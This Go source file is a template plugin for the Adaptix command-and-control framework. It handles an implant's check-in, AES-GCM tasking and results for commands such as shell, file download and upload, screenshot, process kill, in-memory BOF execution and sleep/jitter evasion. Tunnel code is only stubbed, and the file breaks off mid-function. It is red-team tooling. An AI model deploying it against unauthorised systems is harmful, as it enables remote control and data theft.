package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	mrand "math/rand/v2"
	"strconv"
	"strings"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2"
)

// ─── Teamserver interface ──────────────────────────────────────────────────────
// Methods available at runtime from the teamserver.
// Add or remove methods as needed; only those you call must be listed.

type Teamserver interface {
	TsListenerInteralHandler(watermark string, data []byte) (string, error)

	// Agent management
	TsAgentIsExists(agentId string) bool
	TsAgentProcessData(agentId string, bodyData []byte) error
	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error
	TsAgentUpdateDataPartial(agentId string, updateData interface{}) error

	// Build
	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
	TsAgentBuildLog(builderId string, status int, message string) error

	// Console
	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)

	// Pivots
	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
	TsGetPivotInfoByName(pivotName string) (string, string, string)
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsPivotDelete(pivotId string) error

	// Tasks
	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsTaskGetAvailableAll(agentId string, availableSize int) ([]adaptix.TaskData, error)
	TsTaskRunningExists(agentId string, taskId string) bool

	// Downloads
	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error

	// Screenshots
	TsScreenshotAdd(agentId string, Note string, Content []byte) error

	// Client GUI helpers
	TsClientGuiDisksWindows(taskData adaptix.TaskData, drives []adaptix.ListingDrivesDataWin)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)
	TsClientGuiFilesUnix(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataUnix)
	TsClientGuiProcessWindows(taskData adaptix.TaskData, process []adaptix.ListingProcessDataWin)
	TsClientGuiProcessUnix(taskData adaptix.TaskData, process []adaptix.ListingProcessDataUnix)

	// Tunnels
	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)
	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)
	TsTunnelChannelExists(channelId int) bool
	TsTunnelConnectionClose(channelId int, writeOnly bool)
	TsTunnelConnectionHalt(channelId int, errorCode byte)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)
	TsTunnelGetPipe(AgentId string, channelId int) (*io.PipeReader, *io.PipeWriter, error)

	// Terminal
	TsAgentTerminalCloseChannel(terminalId string, status string) error
	TsTerminalConnExists(terminalId string) bool
	TsTerminalConnResume(agentId string, terminalId string, ioDirect bool)
	TsTerminalGetPipe(AgentId string, terminalId string) (*io.PipeReader, *io.PipeWriter, error)

	// Encoding utilities
	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
	TsWin32Error(errorCode uint) string
}

// ─── Types ─────────────────────────────────────────────────────────────────────

type __NAME_CAP__Plugin struct{}

type __NAME_CAP__Extender struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

// ─── Plugin entry point ────────────────────────────────────────────────────────

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	return &__NAME_CAP__Plugin{}
}

func (p *__NAME_CAP__Plugin) GetExtender() adaptix.ExtenderAgent {
	return &__NAME_CAP__Extender{}
}

// ─── Helpers ───────────────────────────────────────────────────────────────────

func makeProxyTask(packData []byte) adaptix.TaskData {
	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: packData, Sync: false}
}

func getStringArg(args map[string]any, key string) (string, error) {
	v, ok := args[key].(string)
	if !ok {
		return "", fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getFloatArg(args map[string]any, key string) (float64, error) {
	v, ok := args[key].(float64)
	if !ok {
		return 0, fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getBoolArg(args map[string]any, key string) bool {
	v, _ := args[key].(bool)
	return v
}

// ─── Tunnel callbacks ──────────────────────────────────────────────────────────

func (ext *__NAME_CAP__Extender) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: TunnelMessageConnectTCP,
		ConnectUDP: TunnelMessageConnectUDP,
		WriteTCP:   TunnelMessageWriteTCP,
		WriteUDP:   TunnelMessageWriteUDP,
		Close:      TunnelMessageClose,
		Reverse:    TunnelMessageReverse,
		Pause:      TunnelMessagePause,
		Resume:     TunnelMessageResume,
	}
}

func TunnelMessageConnectTCP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	// TODO: build tunnel connect TCP packet
	_ = channelId
	_ = address
	_ = port
	return makeProxyTask(packData)
}

func TunnelMessageConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	// TODO: build tunnel connect UDP packet
	_ = channelId
	_ = address
	_ = port
	return makeProxyTask(packData)
}

func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
	// TODO: wrap data for TCP tunnel write
	return makeProxyTask(data)
}

func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
	// TODO: wrap data for UDP tunnel write
	return makeProxyTask(data)
}

func TunnelMessagePause(channelId int) adaptix.TaskData {
	var packData []byte
	// TODO: build tunnel pause packet
	_ = channelId
	return makeProxyTask(packData)
}

func TunnelMessageResume(channelId int) adaptix.TaskData {
	var packData []byte
	// TODO: build tunnel resume packet
	_ = channelId
	return makeProxyTask(packData)
}

func TunnelMessageClose(channelId int) adaptix.TaskData {
	var packData []byte
	// TODO: build tunnel close packet
	_ = channelId
	return makeProxyTask(packData)
}

func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
	var packData []byte
	// TODO: build tunnel reverse packet
	_ = tunnelId
	_ = port
	return makeProxyTask(packData)
}

// ─── Terminal callbacks ────────────────────────────────────────────────────────

func (ext *__NAME_CAP__Extender) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: TerminalMessageStart,
		Write: TerminalMessageWrite,
		Close: TerminalMessageClose,
	}
}

func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	var packData []byte
	// TODO: build terminal start packet
	_ = terminalId
	_ = program
	return makeProxyTask(packData)
}

func TerminalMessageWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
	// TODO: wrap data for terminal write
	return makeProxyTask(data)
}

func TerminalMessageClose(terminalId int) adaptix.TaskData {
	var packData []byte
	// TODO: build terminal close packet
	_ = terminalId
	return makeProxyTask(packData)
}

// ─── PluginAgent interface ─────────────────────────────────────────────────────
// GenerateConfig, GenerateProfiles, and BuildPayload are in pl_build.go
// (language-specific build variant selected by the generator).

func (p *__NAME_CAP__Plugin) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData

	var si SessionInfo
	err := Unmarshal(beat, &si)
	if err != nil {
		return adaptix.AgentData{}, nil, err
	}

	agentData.Computer = si.Hostname
	agentData.Username = si.Username
	agentData.Domain = si.Domain
	agentData.InternalIP = si.InternalIP
	agentData.OsDesc = si.OsVersion
	agentData.Arch = si.OsArch
	agentData.Elevated = si.Elevated
	agentData.Pid = fmt.Sprintf("%d", si.ProcessId)
	agentData.Process = si.ProcessName
	agentData.ACP = int(si.CodePage)
	agentData.OemCP = int(si.CodePage)
	if dur, parseErr := time.ParseDuration(si.Sleep); parseErr == nil {
		agentData.Sleep = uint(dur.Seconds())
	}

	switch strings.ToLower(si.Os) {
	case "windows":
		agentData.Os = adaptix.OS_WINDOWS
	case "darwin":
		agentData.Os = adaptix.OS_MAC
	default:
		agentData.Os = adaptix.OS_LINUX
	}

	return agentData, &__NAME_CAP__Extender{}, nil
}

// ─── ExtenderAgent interface ───────────────────────────────────────────────────

func (ext *__NAME_CAP__Extender) Encrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

func (ext *__NAME_CAP__Extender) Decrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(data) < gcm.NonceSize() {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:gcm.NonceSize()], data[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func (ext *__NAME_CAP__Extender) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	var objects [][]byte
	for _, taskData := range tasks {
		taskId, _ := strconv.ParseUint(taskData.TaskId, 16, 64)
		var command Command
		_ = Unmarshal(taskData.Data, &command)
		command.Id = uint(taskId)
		cmd, _ := Marshal(command)
		objects = append(objects, cmd)
	}
	msg := Message{Type: int8(EXFIL_PACK), Object: objects}
	packData, err := Marshal(msg)
	return packData, err
}

func (ext *__NAME_CAP__Extender) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	var (
		packData []byte
		err      error
	)

	// TODO: Wrap pivot data into your wire format.
	_ = pivotId
	_ = data
	err = errors.New("pivot not implemented")

	taskData := adaptix.TaskData{
		TaskId: fmt.Sprintf("%08x", mrand.Uint32()),
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   packData,
		Sync:   false,
	}

	return taskData, err
}

func (ext *__NAME_CAP__Extender) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: adaptix.TASK_TYPE_TASK,
		Sync: true,
	}

	messageData = adaptix.ConsoleMessageData{
		Status: adaptix.MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	// TODO: Build the command data based on command/subcommand.
	// Use getStringArg/getFloatArg/getBoolArg to extract typed parameters.

	switch command {

	// ── exit ───────────────────────────────────────────────────────────────────
	case "exit":
		taskData.Data, _ = Marshal(Command{Code: COMMAND_EXIT})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	// ── file system ───────────────────────────────────────────────────────────
	case "ls":
		path, _ := args["path"].(string)
		if path == "" {
			path = "."
		}
		data, _ := Marshal(ParamsFsList{Path: path})
		taskData.Data, _ = Marshal(Command{Code: COMMAND_FS_LIST, Data: data})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	case "upload":
		localFile, lfErr := getStringArg(args, "local")
		if lfErr != nil {
			err = lfErr
			break
		}
		remotePath, _ := args["remote"].(string)
		fileContent, decodeErr := base64.StdEncoding.DecodeString(localFile)
		if decodeErr != nil {
			err = decodeErr
			break
		}
		data, _ := Marshal(ParamsFsUpload{Path: remotePath, Data: fileContent})
		taskData.Data, _ = Marshal(Command{Code: COMMAND_FS_UPLOAD, Data: data})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	case "download":
		path, pathErr := getStringArg(args, "path")
		if pathErr != nil {
			err = pathErr
			break
		}
		data, _ := Marshal(ParamsFsDownload{Path: path})
		taskData.Data, _ = Marshal(Command{Code: COMMAND_FS_DOWNLOAD, Data: data})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	case "rm":
		path, pathErr := getStringArg(args, "path")
		if pathErr != nil {
			err = pathErr
			break
		}
		data, _ := Marshal(ParamsFsRemove{Path: path})
		taskData.Data, _ = Marshal(Command{Code: COMMAND_FS_REMOVE, Data: data})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	case "mkdir":
		path, pathErr := getStringArg(args, "path")
		if pathErr != nil {
			err = pathErr
			break
		}
		data, _ := Marshal(ParamsFsMkdirs{Path: path})
		taskData.Data, _ = Marshal(Command{Code: COMMAND_FS_MKDIRS, Data: data})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	case "cp":
		src, srcErr := getStringArg(args, "src")
		if srcErr != nil {
			err = srcErr
			break
		}
		dst, dstErr := getStringArg(args, "dst")
		if dstErr != nil {
			err = dstErr
			break
		}
		data, _ := Marshal(ParamsFsCopy{Src: src, Dst: dst})
		taskData.Data, _ = Marshal(Command{Code: COMMAND_FS_COPY, Data: data})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	case "mv":
		src, srcErr := getStringArg(args, "src")
		if srcErr != nil {
			err = srcErr
			break
		}
		dst, dstErr := getStringArg(args, "dst")
		if dstErr != nil {
			err = dstErr
			break
		}
		data, _ := Marshal(ParamsFsMove{Src: src, Dst: dst})
		taskData.Data, _ = Marshal(Command{Code: COMMAND_FS_MOVE, Data: data})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	case "cd":
		path, _ := args["path"].(string)
		if path == "" {
			path = "."
		}
		data, _ := Marshal(ParamsFsCd{Path: path})
		taskData.Data, _ = Marshal(Command{Code: COMMAND_FS_CD, Data: data})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	case "pwd":
		taskData.Data, _ = Marshal(Command{Code: COMMAND_FS_PWD})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	case "cat":
		path, pathErr := getStringArg(args, "path")
		if pathErr != nil {
			err = pathErr
			break
		}
		data, _ := Marshal(ParamsFsCat{Path: path})
		taskData.Data, _ = Marshal(Command{Code: COMMAND_FS_CAT, Data: data})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	// ── OS commands ───────────────────────────────────────────────────────────
	case "run":
		cmdline, cmdErr := getStringArg(args, "command")
		if cmdErr != nil {
			err = cmdErr
			break
		}
		data, _ := Marshal(ParamsOsRun{Command: cmdline, Output: true, Wait: true})
		taskData.Data, _ = Marshal(Command{Code: COMMAND_OS_RUN, Data: data})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	case "info":
		taskData.Data, _ = Marshal(Command{Code: COMMAND_OS_INFO})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	case "ps":
		taskData.Data, _ = Marshal(Command{Code: COMMAND_OS_PS})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	case "screenshot":
		taskData.Data, _ = Marshal(Command{Code: COMMAND_OS_SCREENSHOT})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	case "shell":
		cmdline, cmdErr := getStringArg(args, "command")
		if cmdErr != nil {
			err = cmdErr
			break
		}
		data, _ := Marshal(ParamsOsShell{Command: cmdline})
		taskData.Data, _ = Marshal(Command{Code: COMMAND_OS_SHELL, Data: data})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	case "kill":
		pid, pidErr := getFloatArg(args, "pid")
		if pidErr != nil {
			err = pidErr
			break
		}
		data, _ := Marshal(ParamsOsKill{Pid: uint32(pid)})
		taskData.Data, _ = Marshal(Command{Code: COMMAND_OS_KILL, Data: data})
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

	// ── profile tuning ────────────────────────────────────────────────────────
	case "profile":
		switch subcommand {
		case "sleep":
			durationStr, durErr := getStringArg(args, "duration")
			if durErr != nil {
				err = durErr
				break
			}
			dur, parseErr := time.ParseDuration(durationStr)
			if parseErr != nil {
				err = fmt.Errorf("invalid duration '%s': %v", durationStr, parseErr)
				break
			}
			jitter := 20
			if jv, ok := args["jitter"].(float64); ok {
				jitter = int(jv)
			}
			data, _ := Marshal(ParamsProfileSleep{Sleep: int(dur.Seconds()), Jitter: jitter})
			taskData.Data, _ = Marshal(Command{Code: COMMAND_PROFILE_SLEEP, Data: data})
			taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())
			messageData.Status = adaptix.MESSAGE_SUCCESS
			messageData.Text = fmt.Sprintf("Sleep updated: %s, jitter %d%%", durationStr, jitter)

		case "killdate":
			dateStr, dateErr := getStringArg(args, "datetime")
			if dateErr != nil {
				err = dateErr
				break
			}
			var killDate int64
			if dateStr != "0" {
				t, parseErr := time.Parse("02.01.2006 15:04:05", dateStr)
				if parseErr != nil {
					err = fmt.Errorf("invalid date '%s': expected DD.MM.YYYY HH:MM:SS", dateStr)
					break
				}
				killDate = t.Unix()
			}
			data, _ := Marshal(ParamsProfileKilldate{KillDate: killDate})
			taskData.Data, _ = Marshal(Command{Code: COMMAND_PROFILE_KILLDATE, Data: data})
			taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())
			if killDate == 0 {
				messageData.Status = adaptix.MESSAGE_SUCCESS
				messageData.Text = "Kill date disabled"
			} else {
				messageData.Status = adaptix.MESSAGE_SUCCESS
				messageData.Text = fmt.Sprintf("Kill date set to %s", dateStr)
			}

		case "worktime":
			rangeStr, rangeErr := getStringArg(args, "range")
			if rangeErr != nil {
				err = rangeErr
				break
			}
			var workStart, workEnd int
			if rangeStr != "0" {
				parts := strings.SplitN(rangeStr, "-", 2)
				if len(parts) != 2 {
					err = fmt.Errorf("invalid range '%s': expected HH:MM-HH:MM", rangeStr)
					break
				}
				startParts := strings.SplitN(strings.TrimSpace(parts[0]), ":", 2)
				endParts := strings.SplitN(strings.TrimSpace(parts[1]), ":", 2)
				if len(startParts) != 2 || len(endParts) != 2 {
					err = fmt.Errorf("invalid range '%s': expected HH:MM-HH:MM", rangeStr)
					break
				}
				sh, _ := strconv.Atoi(startParts[0])
				sm, _ := strconv.Atoi(startParts[1])
				eh, _ := strconv.Atoi(endParts[0])
				em, _ := strconv.Atoi(endParts[1])
				workStart = sh*60 + sm
				workEnd = eh*60 + em
			}
			data, _ := Marshal(ParamsProfileWorktime{WorkStart: workStart, WorkEnd: workEnd})
			taskData.Data, _ = Marshal(Command{Code: COMMAND_PROFILE_WORKTIME, Data: data})
			taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())
			if workStart == 0 && workEnd == 0 {
				messageData.Status = adaptix.MESSAGE_SUCCESS
				messageData.Text = "Working hours disabled"
			} else {
				messageData.Status = adaptix.MESSAGE_SUCCESS
				messageData.Text = fmt.Sprintf("Working hours set to %s", rangeStr)
			}

		default:
			err = fmt.Errorf("unknown profile subcommand: %s", subcommand)
		}

	// ── BOF execution ─────────────────────────────────────────────────────────
	case "execute":
		if subcommand == "bof" {
			taskData.Type = adaptix.TASK_TYPE_JOB

			r := make([]byte, 4)
			_, _ = rand.Read(r)
			taskId := binary.BigEndian.Uint32(r)
			taskData.TaskId = fmt.Sprintf("%08x", taskId)

			asyncMode := getBoolArg(args, "-a")

			bofFile, bofErr := getStringArg(args, "bof")
			if bofErr != nil {
				err = bofErr
				break
			}
			bofContent, decodeErr := base64.StdEncoding.DecodeString(bofFile)
			if decodeErr != nil {
				err = decodeErr
				break
			}

			paramData, _ := args["param_data"].(string)

			packerData, _ := Marshal(ParamsExecBof{Object: bofContent, ArgsPack: paramData, Task: taskData.TaskId})
			if asyncMode {
				taskData.Data, _ = Marshal(Command{Code: COMMAND_EXEC_BOF_ASYNC, Data: packerData})
			} else {
				taskData.Data, _ = Marshal(Command{Code: COMMAND_EXEC_BOF, Data: packerData})
			}
		} else {
			err = errors.New("subcommand must be 'bof'")
		}

	// ── job management ────────────────────────────────────────────────────────
	case "job":
		if subcommand == "list" {
			taskData.Data, _ = Marshal(Command{Code: COMMAND_JOB_LIST})
			taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())
		} else if subcommand == "kill" {
			taskId, killErr := getStringArg(args, "task_id")
			if killErr != nil {
				err = killErr
				break
			}
			killData, _ := Marshal(ParamsJobKill{Id: taskId})
			taskData.Data, _ = Marshal(Command{Code: COMMAND_JOB_KILL, Data: killData})
			taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())
		} else {
			err = errors.New("subcommand must be 'list' or 'kill'")
		}

	default:
		err = fmt.Errorf("unknown command: %s", command)
	}

	return taskData, messageData, err
}

func (ext *__NAME_CAP__Extender) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	var outTasks []adaptix.TaskData

	taskDefaults := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: adaptix.MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	var inMessage Message
	if err := Unmarshal(decryptedData, &inMessage); err != nil {
		return errors.New("failed to unmarshal message")
	}

	// ── Normal command responses (Type 0 from implant) ─────────────────────
	for _, cmdBytes := range inMessage.Object {
		var cmd Command
		if err := Unmarshal(cmdBytes, &cmd); err != nil {
			continue
		}

		task := taskDefaults
		task.TaskId = fmt.Sprintf("%08x", cmd.Id)

		switch cmd.Code {

		case RESP_COMPLETE:
			task.Message = "Completed"

		case RESP_ERROR:
			var params AnsError
			if err := Unmarshal(cmd.Data, &params); err != nil {
				continue
			}
			task.Message = fmt.Sprintf("Error: %s", params.Message)
			task.MessageType = adaptix.MESSAGE_ERROR

		case RESP_FS_LIST:
			var params AnsFsList
			if err := Unmarshal(cmd.Data, &params); err != nil {
				continue
			}

			if agentData.Os == adaptix.OS_WINDOWS {
				var items []adaptix.ListingFileDataWin
				for _, e := range params.Entries {
					items = append(items, adaptix.ListingFileDataWin{
						IsDir:    e.IsDir,
						Size:     e.Size,
						Date:     e.ModTime,
						Filename: e.Name,
					})
				}

				outputText := fmt.Sprintf(" %-8s %-14s %-20s  %s\n", "Type", "Size", "Last Modified", "Name")
				outputText += fmt.Sprintf(" %-8s %-14s %-20s  %s", "----", "---------", "----------------", "----")
				for _, item := range items {
					t := time.Unix(item.Date, 0).UTC()
					lastWrite := fmt.Sprintf("%02d/%02d/%d %02d:%02d", t.Day(), t.Month(), t.Year(), t.Hour(), t.Minute())
					if item.IsDir {
						outputText += fmt.Sprintf("\n %-8s %-14s %-20s  %s", "dir", "", lastWrite, item.Filename)
					} else {
						outputText += fmt.Sprintf("\n %-8s %-14d %-20s  %s", "", item.Size, lastWrite, item.Filename)
					}
				}
				task.Message = fmt.Sprintf("Listing '%s'", params.Path)
				task.ClearText = outputText
				Ts.TsClientGuiFilesWindows(task, params.Path, items)
			} else {
				var items []adaptix.ListingFileDataUnix
				for _, e := range params.Entries {
					t := time.Unix(e.ModTime, 0).UTC()
					dateStr := fmt.Sprintf("%02d/%02d/%d %02d:%02d", t.Day(), t.Month(), t.Year(), t.Hour(), t.Minute())
					items = append(items, adaptix.ListingFileDataUnix{
						IsDir:    e.IsDir,
						Size:     e.Size,
						Date:     dateStr,
						Filename: e.Name,
					})
				}

				outputText := fmt.Sprintf(" %-14s %-20s  %s\n", "Size", "Last Modified", "Name")
				outputText += fmt.Sprintf(" %-14s %-20s  %s", "---------", "----------------", "----")
				for _, item := range items {
					if item.IsDir {
						outputText += fmt.Sprintf("\n %-14s %-20s  %s", "dir", item.Date, item.Filename)
					} else {
						outputText += fmt.Sprintf("\n %-14d %-20s  %s", item.Size, item.Date, item.Filename)
					}
				}
				task.Message = fmt.Sprintf("Listing '%s'", params.Path)
				task.ClearText = outputText
				Ts.TsClientGuiFilesUnix(task, params.Path, items)
			}

		case RESP_FS_UPLOAD:
			var params AnsFsUpload
			if err := Unmarshal(cmd.Data, &params); err != nil {
				continue
			}
			task.Message = fmt.Sprintf("File '%s' successfully uploaded", params.Path)
			Ts.TsClientGuiFilesStatus(task)

		case RESP_FS_DOWNLOAD:
			var params AnsFsDownload
			if err := Unmarshal(cmd.Data, &params); err != nil {
				continue
			}
			fileId := fmt.Sprintf("%08x", mrand.Uint32())
			_ = Ts.TsDownloadSave(agentData.Id, fileId, params.Path, params.Data)
			task.Message = fmt.Sprintf("Downloaded '%s' (%d bytes)", params.Path, len(params.Data))

		case RESP_OS_RUN:
			var params AnsOsRun
			if err := Unmarshal(cmd.Data, &params); err != nil {
				continue
			}
			task.Message = "Command output:"
			if agentData.Os == adaptix.OS_WINDOWS {
				task.ClearText = Ts.TsConvertCpToUTF8(params.Output, agentData.OemCP)
			} else {
				task.ClearText = params.Output
			}

		case RESP_OS_INFO:
			var params AnsOsInfo
			if err := Unmarshal(cmd.Data, &params); err != nil {
				continue
			}

			newData := agentData
			newData.Computer = params.Hostname
			newData.Username = params.Username
			newData.Domain = params.Domain
			newData.InternalIP = params.InternalIP
			newData.Arch = params.OsArch
			newData.Elevated = params.Elevated
			newData.Pid = fmt.Sprintf("%d", params.ProcessId)
			newData.Process = params.ProcessName
			newData.OsDesc = params.OsVersion
			newData.ACP = int(params.CodePage)
			newData.OemCP = int(params.CodePage)

			osLower := strings.ToLower(params.Os)
			if strings.Contains(osLower, "windows") {
				newData.Os = adaptix.OS_WINDOWS
			} else if strings.Contains(osLower, "darwin") || strings.Contains(osLower, "macos") {
				newData.Os = adaptix.OS_MAC
			} else {
				newData.Os = adaptix.OS_LINUX
			}

			_ = Ts.TsAgentUpdateData(newData)

			task.Message = "Agent info updated"
			task.ClearText = fmt.Sprintf("Host: %s\\%s@%s\nIP: %s\nOS: %s %s (%s)\nPID: %d (%s)\nElevated: %v",
				params.Domain, params.Username, params.Hostname,
				params.InternalIP,
				params.Os, params.OsVersion, params.OsArch,
				params.ProcessId, params.ProcessName,
				params.Elevated)

		case RESP_OS_PS:
			var params AnsOsPs
			if err := Unmarshal(cmd.Data, &params); err != nil {
				continue
			}

			if len(params.Processes) == 0 {
				task.Message = "No processes found"
				task.MessageType = adaptix.MESSAGE_ERROR
			} else if agentData.Os == adaptix.OS_WINDOWS {
				var proclist []adaptix.ListingProcessDataWin
				for _, p := range params.Processes {
					proclist = append(proclist, adaptix.ListingProcessDataWin{
						Pid:         uint(p.Pid),
						Ppid:        uint(p.PPid),
						SessionId:   uint(p.Session),
						Arch:        p.Arch,
						Context:     p.User,
						ProcessName: p.Name,
					})
				}

				outputText := fmt.Sprintf(" %-7s %-7s %-7s %-6s %-20s %s\n", "PID", "PPID", "Session", "Arch", "User", "Process")
				outputText += fmt.Sprintf(" %-7s %-7s %-7s %-6s %-20s %s", "---", "----", "-------", "----", "----", "-------")
				for _, p := range proclist {
					outputText += fmt.Sprintf("\n %-7d %-7d %-7d %-6s %-20s %s", p.Pid, p.Ppid, p.SessionId, p.Arch, p.Context, p.ProcessName)
				}
				task.Message = "Process list:"
				task.ClearText = outputText
				Ts.TsClientGuiProcessWindows(task, proclist)
			} else {
				var proclist []adaptix.ListingProcessDataUnix
				for _, p := range params.Processes {
					proclist = append(proclist, adaptix.ListingProcessDataUnix{
						Pid:         uint(p.Pid),
						Ppid:        uint(p.PPid),
						Context:     p.User,
						ProcessName: p.Name,
					})
				}

				outputText := fmt.Sprintf(" %-7s %-7s %-20s %s\n", "PID", "PPID", "User", "Process")
				outputText += fmt.Sprintf(" %-7s %-7s %-20s %s", "---", "----", "----", "-------")
				for _, p := range proclist {
					outputText += fmt.Sprintf("\n %-7d %-7d %-20s %s", p.Pid, p.Ppid, p.Context, p.ProcessName)
				}
				task.Message = "Process list:"
				task.ClearText = outputText
				Ts.TsClientGuiProcessUnix(task, proclist)
			}

		case RESP_OS_SCREENSHOT:
			var params AnsOsScreenshot
			if err := Unmarshal(cmd.Data, &params); err != nil {
				continue
			}
			_ = Ts.TsScreenshotAdd(agentData.Id, "", params.Image)
			task.Message = "Screenshot saved"

		case RESP_FS_PWD:
			var params AnsFsPwd
			if err := Unmarshal(cmd.Data, &params); err != nil {
				continue
			}
			task.Message = fmt.Sprintf("Current directory: %s", params.Path)
			task.ClearText = params.Path

		case RESP_FS_CAT:
			var params AnsFsCat
			if err := Unmarshal(cmd.Data, &params); err != nil {
				continue
			}
			task.Message = "File contents:"
			if agentData.Os == adaptix.OS_WINDOWS {
				task.ClearText = Ts.TsConvertCpToUTF8(params.Content, agentData.ACP)
			} else {
				task.ClearText = params.Content
			}

		case RESP_OS_SHELL:
			var params AnsOsShell
			if err := Unmarshal(cmd.Data, &params); err != nil {
				continue
			}
			task.Message = "Shell output:"
			if agentData.Os == adaptix.OS_WINDOWS {
				task.ClearText = Ts.TsConvertCpToUTF8(params.Output, agentData.OemCP)
			} else {
				task.ClearText = params.Output
			}

		case COMMAND_EXEC_BOF:
			var params AnsExecBof
			if err := Unmarshal(cmd.Data, &params); err != nil {
				continue
			}
			var msgs []BofMsg
